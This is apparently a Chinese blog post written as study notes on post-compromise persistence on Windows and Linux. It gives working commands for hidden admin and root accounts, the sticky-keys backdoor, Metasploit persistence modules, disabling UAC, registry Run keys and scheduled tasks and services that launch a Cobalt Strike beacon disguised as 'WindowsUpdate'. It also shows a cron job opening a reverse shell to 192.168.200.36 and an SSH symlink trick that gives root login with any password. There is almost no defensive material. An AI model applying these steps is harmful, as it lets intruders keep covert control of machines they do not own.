突然意识到了权限维持的重要性，之前一直都把重点放在如何获取权限，而却忽视了获取权限之后如何维持，本文作为学习笔记记录一下，欢迎探讨。

## 创建用户

创建用户是最简单的权限维持方式，但是也是最为容易被发现的方式。

### windows创建用户

    
    
    net user lry 123admin@ /add #创建普通账号lry 密码为123admin@
    net localgroup administrators lry /add #将普通账号lry 添加进administrators组
    

### linux创建用户

创建一个用户名为lry，密码为123456的root用户。

    
    
    useradd -p openssl passwd 123456lry -o -u 0-g root -G root -s /bin/bash -d /home/lry
    

## 辅助功能后门

辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读等），可以帮助残疾人更轻松地使用Windows操作系统但是，此功能可能会被滥用，以在已启用RDP且已获得管理员级别权限的主机上实现持久性。

    
    
    屏幕键盘：C:\Windows\System32\osk.exe
    放大镜：C:\Windows\System32\Magnify.exe
    旁白：C:\Windows\System32\Narrator.exe
    显示开关：C:\Windows\System32\DisplaySwitch.exe
    应用程序开关：C:\Windows\System32\AtBroker.exe
    粘滞键：C:\Windows\System32\sethc.exe
    辅助功能：C:\Windows\System32\utilman.exe
    

### 粘滞键后门

 **以粘滞键后门举例**

在 Windows主机上连续按5次“ Shift”键，就可以调出粘滞键。
Windows的粘滞键主要是为无法同时按多个按键的用户设计的。例如，在使用组合键“Crl+P"时，用户需要同时按下“Crl和“P”两个键，如果使用粘滞键来实现组合键“Crl+P”的功能，用户只需要按一个键。

![1638685585_61ac5b9118438f6932aef.png!small](https://image.3001.net/images/20211205/1638685585_61ac5b9118438f6932aef.png!small)

为什么说粘滞键可以变成后门呢，因为电脑在锁屏的时候也可以触发粘滞键，所以只要替换了粘滞键的命令就能实现权限维持。

用可执行文件 sethc.exe.bak替换 windows\system32目录下的粘滞键可执行文件 sethc.exe,命令如下。

    
    
    cd c:\windows\system32
    move sethc.exe sethc.exe.bak
    copy cmd.exe sethc.exe
    

不过现在的服务器一般都没有办法用这种方式执行，我们还可以利用msf里面自带的模块进行后门的留取。
**![1638685609_61ac5ba98d8d34e861349.png!small](https://image.3001.net/images/20211205/1638685609_61ac5ba98d8d34e861349.png!small)**

以利用msf里面自带的模块进行后门的留取。

    
    
    use post/windows/manage/sticky_keys
    setsession 1settarget UTILMAN
    exploit
    

target可以设置不同的留后门方法，其中就有粘滞键。![1638685674_61ac5bea631626e3c3370.png!small?1638685673710](https://image.3001.net/images/20211205/1638685674_61ac5bea631626e3c3370.png!small?1638685673710)

C:\Windows\System32\sethc.exe 粘滞键 快捷键：按五次 shift 键；  
C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U 键；  
C:\Windows\System32\osk.exe 屏幕键盘；

粘滞键攻击win2008（win10攻击失败）。![1638685692_61ac5bfca1b34163e7752.png!small?1638685691989](https://image.3001.net/images/20211205/1638685692_61ac5bfca1b34163e7752.png!small?1638685691989)

针对粘滞键后门，可以采取如下防范措施。

> 在远程登录服务器时，连续按5次" Shift”键，判断服务器是否被入侵。
>
> 拒绝使用 sethc.exe或者在“控制面板”中关闭“启用粘滞键”选项。

## 注册表注入后门

注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。

 **Win+r 输入regedit进入注册表编辑器**

如下是控制计算机启动项的注册表信息。

Run中的程序是WINDOWS初始化后才运行的，而RunService中的程序是在操作系统启动时就开始运行的，也就是说RunServices中的程序先于Run中的程序运行，如电源管理程序。

    
    
    #当前用户所用信息储存地
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
    #机器软硬件信息的集散地
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
    HKEY_LOCAL_MACHINE\Software\wow6432node\microsoft\windows\currentversion\Run
    #添加
    REG ADD “KeyName” /v “ValueName” /t REG_SZ /d “Data” /f 
    #操作HKEY_LOCAL_MACHINE需要高权限
    #KeyName 远程机器名 -忽略默认到当前机器。
    #/v 所选项之下要添加的值名称。 
    #/ve为注册表项添加空白值名称(默认)。
    #/t RegKey 数据类型 REG_SZ型注册表值项没有长度限制 
    #/d 要分配给添加的注册表ValueName 的数据。 
    #/f 不用提示就强行覆盖现有注册表项。
    #查询
    reg query “KeyName” \v ValueName 
    #不需要权限
    #删除
    reg delete “KeyName” \v ValueName /f 
    #操作HKEY_LOCAL_MACHINE需要高权限 /f不用提示，强制删除。不加会询问是否删除
    

### msf注册表后门

    
    
    run persistence -U -i 5-p 5555-r 192.168.200.36
    

![1638685863_61ac5ca79e3b3b2bdfaf2.png!small?1638685863677](https://image.3001.net/images/20211205/1638685863_61ac5ca79e3b3b2bdfaf2.png!small?1638685863677)

-S:系统启动时加载；

-U:用户登陆时加载；

-X:开机时自动加载；

-i:回连的时间间隔；

-r:你的接收shell的电脑IP。

![1638685883_61ac5cbb05ac0bae9d23b.png!small?1638685882358](https://image.3001.net/images/20211205/1638685883_61ac5cbb05ac0bae9d23b.png!small?1638685882358)

![1638685898_61ac5cca94b017606eecc.png!small?1638685897989](https://image.3001.net/images/20211205/1638685898_61ac5cca94b017606eecc.png!small?1638685897989)

想重启监听看看能不能上线，但是试了win10、win7、win2008都不能利用。而win7还给我搞炸了，每次开启就会一直弹窗。

### 注册表

指定当程序尝试对计算机进行更改时是否将 Windows 用户帐户控制 (UAC) 通知用户。 UAC
以前称为[受限用户帐户](https://www.zhihu.com/search?q=%E5%8F%97%E9%99%90%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A1912159565%7D)(LUA)。

使用命令将EnableLUA 设置为0（后面试了一下好像改不改这个都无所谓）。

    
    
    shell reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0/f
    

查询

    
    
    shell reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    

![1638685929_61ac5ce997d58edb05846.png!small?1638685929289](https://image.3001.net/images/20211205/1638685929_61ac5ce997d58edb05846.png!small?1638685929289)

直接插入注册表里，成为自启动文件。

    
    
    shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"/v shell/t REG_SZ /d "C:\Users\testuser\Desktop\cs_shell.exe" /f
    

查询是否设置成功。

    
    
    shell reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    

![1638685952_61ac5d00ede2f2fac0a8a.png!small](https://image.3001.net/images/20211205/1638685952_61ac5d00ede2f2fac0a8a.png!small)

可以看到设置成功，

重启试试看——成功上线。

![1638685988_61ac5d244b9d0fa45e717.png!small?1638685987540](https://image.3001.net/images/20211205/1638685988_61ac5d244b9d0fa45e717.png!small?1638685987540)

## 计划任务后门

计划任务在 Windows7及之前版本的操作系统中使用at命令调用，在从 Windows8版本开始的操作系统中使用
schtasks命令调用。计划任务后门分为管理员权限和普通用户权限两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行等。

at计划任务：

    
    
    at \\192.168.200.3613:56C:\shell.exe   #创建一项计划任务到时间打开shell.exe程序
    

schtasks计划任务。参考[Schtasks命令详解_jataflf的专栏-CSDN博客](https://blog.csdn.net/jataflf/article/details/52788280)

    
    
    schtasks /create /s 192.168.200.36/tn test /sc once /st 17:07/tr c:\shell.exe /ru system /f   #创建一次计划任务
    schtasks /create /s 192.168.200.36/tn test /sc onstart /sd 12/4/2021/tr c:\shell.exe /ru system /f   #系统启动时执行计划任务
    schtasks /create /s 192.168.200.36 /tn test /sc minute /mo 10 /tr c:\shell.exe /ru system /f  #每十分钟执行一次计划任务
    

使用cs的后门演示计划任务，

使用cs生成一个exe后门，上线cs假设获取了目标主机的权限，现在开始进行权限维持。

![1638686024_61ac5d4801e427e624129.png!small?1638686023450](https://image.3001.net/images/20211205/1638686024_61ac5d4801e427e624129.png!small?1638686023450)

上线之后进行计划任务，

每分钟执行一次。

    
    
    schtasks /create /tn WindowsUpdate /tr "C:\Users\fish\Desktop\cs_shell.exe"/sc minute /mo 1 /ru System /f
    

或者当系统启动时执行，

    
    
    schtasks /create /tn WindowsUpdate /tr "C:\Users\fish\Desktop\cs_shell.exe"/sc onstart /ru System /f
    

可以看到一开机就自动上线。

![1638686041_61ac5d59da14f4a23a3c5.png!small?1638686041361](https://image.3001.net/images/20211205/1638686041_61ac5d59da14f4a23a3c5.png!small?1638686041361)

### linux

linux计划任务为crontab命令，但它的打开方式有两种。

1、/etc/crontab
修改/etc/crontab这种方法只有root用户能用，这种方法更加方便与直接直接给其他用户设置计划任务，而且还可以指定执行shell等等。

    
    
    echo "/bin/bash -i >& /dev/tcp/192.168.200.36/9999 0>&1"  >> shell.sh    #创建shell脚本
    chmod +x shell.sh     #添加执行权限
    echo '*/1 * * * * root /root/shell.sh' >> /etc/crontab  #设置定时任务。以root权限每分钟执行一次脚本
    cat /etc/crontab  #查看是否设置成功
    

2、crontab -e ，这种所有用户都可以使用，普通用户也只能为自己设置计划任务。

    
    
    echo "/bin/bash -i >& /dev/tcp/192.168.200.36/9999 0>&1"  >> shell.sh    #创建shell脚本
    chmod +x shell.sh     #添加执行权限
    crontab -e   #打开计划任务文档
    */1 * * * * root /root/shell.sh   #在文档中设置定时任务。以root权限每分钟执行一次脚本
    service crond restart  #重启crond服务
    

* * * * * COMMAND * 的位置分别代表分钟、小时、日期、月份、星期，通过设置不同的参数来设置任务执行的时刻，其中*/代表每*执行。可以在 [Crontab.guru - The cron schedule expression editor](https://crontab.guru/)网站中了解尝试。

以CentOS
8为实验对象：![1638714355_61accbf3aab0078585cfa.png!small?1638714356027](https://image.3001.net/images/20211205/1638714355_61accbf3aab0078585cfa.png!small?1638714356027)

在设置完计划任务之后，进行nc监听，我没有运行脚本，也返回了shell过来

![1638714420_61accc345c235050d68bd.png!small?1638714420620](https://image.3001.net/images/20211205/1638714420_61accc345c235050d68bd.png!small?1638714420620)

## 服务自启动

有点类似与计划任务，但是只能开机时启动，sc作用是在注册表和服务数据库中创建服务项,微软查到的意思是为注册表中的服务和服务控制管理器数据库创建子项和项。

假设拿到了目标主机的shell，可以输入如下语句建立服务自启动后门。

    
    
    sc create "test"binpath= "C:\Users\fish\Desktop\cs_shell.exe" start=auto displayname="Windows-Update"
    sc description "test ""测试"
    net start "test"
    sc query test   #查询服务项sc delete test  #删除
    

![1638686058_61ac5d6a9584598ad0718.png!small?1638686057854](https://image.3001.net/images/20211205/1638686058_61ac5d6a9584598ad0718.png!small?1638686057854)

开启这个服务测试一下，成功上线。

![1638686070_61ac5d768f1fb8f075853.png!small?1638686069824](https://image.3001.net/images/20211205/1638686070_61ac5d768f1fb8f075853.png!small?1638686069824)

![1638686090_61ac5d8a66af9fab372fd.png!small?1638686089663](https://image.3001.net/images/20211205/1638686090_61ac5d8a66af9fab372fd.png!small?1638686089663)

任务管理器可以查看到设置的服务。

![1638686107_61ac5d9b1e25b9aa1fbfa.png!small?1638686106415](https://image.3001.net/images/20211205/1638686107_61ac5d9b1e25b9aa1fbfa.png!small?1638686106415)

重启win10之后依旧上线。

## 启动文件夹

简单的提一嘴，Windows系统都有一个“启动”文件夹，把需要打开的程序的快捷方式放到“启动”文件夹里，就可以实现开机自动启动。

如果想要实现应用程序在所有的用户登录系统后都能自动启动，就把该应用程序的快捷方式放到系统启动文件夹里。

    
    
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
    

如果想要实现某个应用程序只在某个用户登录系统时自动启动，那么就把该应用程序的快捷方式放到这个用户启动文件夹里。

    
    
    C:\Users\fish\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    

![1638686170_61ac5dda5b41a1176dfd4.png!small](https://image.3001.net/images/20211205/1638686170_61ac5dda5b41a1176dfd4.png!small)

## SSH 软连接后门

还遇到了一种linux的权限维持方法——软连接。

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而
su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录：

    
    
    ln -sf /usr/sbin/sshd /tmp/su 
    /tmp/su -oPort=8080
    
    ssh root@127.0.0.1-p 8080
    

在以root权限设置完之后，切换到低权限用户实验一下，密码随便输入，就登陆到了root用户。![1638714471_61accc67a32dbed90cd25.png!small?1638714471912](https://image.3001.net/images/20211205/1638714471_61accc67a32dbed90cd25.png!small?1638714471912)

